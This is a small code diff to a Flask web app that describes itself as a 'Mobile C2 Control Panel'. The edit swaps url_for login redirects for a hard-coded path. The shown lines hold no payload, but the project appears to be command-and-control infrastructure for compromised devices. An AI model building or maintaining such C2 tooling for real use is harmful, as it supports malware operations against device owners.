@@ -40,14 +40,14 @@ def panel():
         change_token(client_token)
         return resp
     else:
-        return redirect(url_for('login'))
+        return redirect('/login')
 
     return render_template('panel.html', username=session.get('IAm-logined'))
 @bp.route('/mobile_control')
 def mobile_control():
     """Mobile C2 Control Panel"""
     if not session.get('IAm-logined'):
-        return redirect(url_for('login'))
+        return redirect('/login')
     return render_template('mobile_control.html')
 @bp.route('/panel.php')
 def panel_php():
